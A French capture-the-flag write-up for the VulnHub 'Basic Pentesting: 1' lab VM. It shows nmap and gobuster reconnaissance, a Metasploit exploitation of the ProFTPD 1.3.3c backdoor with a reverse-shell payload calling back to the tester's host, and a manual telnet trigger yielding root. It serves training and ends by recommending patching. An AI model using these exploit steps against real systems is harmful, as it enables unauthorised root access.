---
title: "Write-up | Basic Pentesting: 1"
date: 2020-07-10T13:38:24+02:00
draft: false
tags:
  - writeup
  - vulnhub
  - rootme
---

Ce write-up est dédié à la box basic_pentesting_1. J'ai récupéré le .ova sur [VulnHub](https://www.vulnhub.com/), mais elle est également accessible sur [Root Me](https://www.root-me.org/).

Synopsis :
> This is a small boot2root VM I created for my university’s cyber security group. It contains multiple remote vulnerabilities and multiple privilege escalation vectors. I did all of my testing for this VM on VirtualBox, so that’s the recommended platform. I have been informed that it also works with VMware, but I haven’t tested this personally.
This VM is specifically intended for newcomers to penetration testing. If you’re a beginner, you should hopefully find the difficulty of the VM to be just right.
Your goal is to remotely attack the VM and gain root privileges. Once you’ve finished, try to find other vectors you might have missed!

## Reconnaissance

Scan des ports :
```
$ nmap -sV -sC 192.168.1.111 -oN scans/ports.txt
...
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.3c
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d6:01:90:39:2d:8f:46:fb:03:86:73:b3:3c:54:7e:54 (RSA)
|   256 f1:f3:c0:dd:ba:a4:85:f7:13:9a:da:3a:bb:4d:93:04 (ECDSA)
|_  256 12:e2:98:d2:a3:e7:36:4f:be:6b:ce:36:6b:7e:0d:9e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
Nous avons donc un port SSH ouvert, un port FTP ainsi qu'un serveur web Apache.
Énumération du serveur :
```
$ gobuster dir -u 192.168.1.111 -w /usr/share/wordlists/dirb/big.txt -o scans/dirs.txt
...
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/secret (Status: 301)
/server-status (Status: 403)
```
Super, un lien secret ! Il contient un blog WordPress vide.
Lors du scan des ports, j'ai remarqué que la version de ProFTPD est la 1.3.3c. Je la connais car elle possède une vulnérabilité assez sévère : une backdoor. De plus, il existe un module `msf` pour l'exploiter.

## Exploitation

```
msf5 > use exploit/unix/ftp/proftpd_133c_backdoor
msf5 exploit(unix/ftp/proftpd_133c_backdoor) > set rhost 192.168.1.111
rhost => 192.168.1.111
msf5 exploit(unix/ftp/proftpd_133c_backdoor) > show payloads
msf5 exploit(unix/ftp/proftpd_133c_backdoor) > set payload cmd/unix/reverse
payload => cmd/unix/reverse
msf5 exploit(unix/ftp/proftpd_133c_backdoor) > set lhost 192.168.1.209
lhost => 192.168.1.209
msf5 exploit(unix/ftp/proftpd_133c_backdoor) > exploit
```
C'est quand même magique `msf` :)

L'inferface ouverte est quand même sacrément moche, du coup je fais spawn un shell en `python` :
```
python -c 'import pty; pty.spawn("/bin/sh")'
# whoami
whoami
root
```
:)

## ProFTPD 1.3.3c

Pourquoi ce service est vulnérable ?

En novembre 2010, le serveur principal du projet ProFTPD a été compromis. Les attaquants ont probablement utilisé une faille de sécurité non-patchée dans le démon FTP sur serveur pour gagner l'accès. Ils ont ensuite remplacé les fichiers source de ProFTPD 1.3.3c par une version qui contient une backdoor.

La modification a été remarquée quelques jours après et a été relayée aux équipes ProFTPD qui l'ont patché rapidement.

Comme on a pu le voir au fil de write-up, cette backdoor donne un accès root, c'est donc peu banal comme vulnérabilité.

Pour tester si un service est vulnérable, effectuer une connection `telnet` sur le port 21 du serveur et envoyer une commande spécifique suffit :
```
$ telnet 192.168.1.111 21
Trying 192.168.1.111...
Connected to 192.168.1.111.
Escape character is '^]'.
220 ProFTPD 1.3.3c Server (vtcsec) [192.168.1.111]
HELP ACIDBITCHEZ
id;
uid=0(root) gid=0(root) groups=0(root),65534(nogroup)
```
Bien évidemment, la solution la plus efficace face à cette faille est la mise à jour :)
